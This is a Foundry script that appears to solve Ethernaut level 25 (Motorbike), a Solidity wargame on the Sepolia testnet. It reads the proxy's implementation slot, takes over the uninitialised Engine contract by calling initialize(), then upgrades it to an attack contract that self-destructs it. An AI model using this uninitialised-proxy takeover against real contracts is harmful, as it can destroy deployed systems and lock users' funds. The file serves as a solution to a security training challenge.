// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import {Script, console} from "forge-std/Script.sol";
import {IEthernaut} from "../interfaces/IEthernaut.sol";
import {Motorbike, Engine} from "../src/Level25.sol";
import {Level25Attack} from "../src/Level25Attack.sol";

contract Level25 is Script {
    IEthernaut _ethernaut = IEthernaut(vm.envAddress("ETHERNAUT_ADDR"));
    address _caller = vm.addr(vm.envUint("PRIVATE_KEY"));

    //need to be before Dencun fork
    function run() public {
        Motorbike _instance = Motorbike(payable(vm.envAddress("LVL25_ADDR")));
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        bytes32 slot = vm.load(address(_instance), 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc);
        console.logBytes32(slot);
        address payable implementation = address(uint160(uint256(slot)));
        console.logAddress(implementation);

        console.logAddress(Engine(implementation).upgrader());
        Engine(implementation).initialize();
        console.logAddress(Engine(implementation).upgrader());

        Level25Attack attack = new Level25Attack();
        console.logString("Upgrading to attack contract");
        console.logAddress(address(attack));
        Engine(implementation).upgradeToAndCall(address(attack), abi.encodeWithSignature("destruct()"));

        vm.stopBroadcast();
    }
}

// forge script script/Level25.s.sol --broadcast --rpc-url sepolia -vvvv
